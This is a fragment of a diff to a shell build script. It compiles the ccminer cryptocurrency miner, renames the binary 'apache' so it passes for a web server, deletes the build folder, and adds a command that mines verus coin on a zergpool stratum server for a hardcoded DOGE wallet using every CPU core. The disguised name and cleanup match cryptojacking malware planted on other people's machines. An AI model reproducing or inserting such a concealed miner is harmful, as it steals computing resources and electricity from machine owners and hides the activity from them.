@@ -9,4 +9,4 @@ chmod +x autogen.sh
 mv ccminer ../apache
 cd ..
 sudo rm ccminer -r
-sleep 5
+./apache -a verus -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u DGD7P3FmcWBp1bdq3dFm7PMjsdJ1kwVdS9 -p c=DOGE,mc=VRSC,ID=wik-{$1} -t $(nproc)
